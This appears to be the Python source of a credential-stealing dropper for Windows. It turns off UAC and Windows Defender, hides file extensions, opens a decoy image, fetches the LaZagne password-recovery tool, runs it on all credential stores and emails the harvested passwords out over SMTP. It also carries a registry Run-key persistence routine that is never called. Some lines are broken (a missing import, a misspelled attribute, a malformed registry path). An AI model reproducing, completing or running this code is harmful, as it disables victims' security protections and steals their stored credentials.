import requests
import subprocess
import smtplib
import os
import tempfile
import shutil

# Adds Download.exe to windows reg editor for persisitenece
def become_persistent():
    Malocation = os.environ["appdata"] + "\\Windows Explorer.exe"
    if not os.path.exists(Malocation):
        shutil.copyfile(sys.exexutable, Malocation)
        subprocess.call("reg add Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Explorer /t REG_SZ /d dist/new/image.exe" + Malocation, shell=True)

def Stop_WinDef_UAC():
    subprocess.Popen("reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f", shell=True)
    subprocess.Popen("sc config WinDefend start= disabled", shell=True)
    subprocess.Popen("sc stop WinDefend", shell=True)

Stop_WinDef_UAC()

# Turns file extentions off
subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 1 /f")

file_name = "paypalSS.png"
subprocess.Popen(file_name, shell=True)

def Download(url):
    GetResponse = requests.get(url)
    filename = url.split("/") [-1]

    with open(filename, "wb") as out_file:
        out_file.write(GetResponse.content)

    print(GetResponse)

def SendMail(email, password, message):

    server = smtplib.SMTP("smtp.office365.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir() # Get's temp directory to place lazagne.exe in
os.chdir(temp_directory)

Download("http://github.com//AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")

# Runs lazagne.exe on all search types for credential harvesting
result = subprocess.check_output("lazagne.exe all", shell=True)
print(result)

SendMail("", "", result)
os.remove("lazagne.exe")
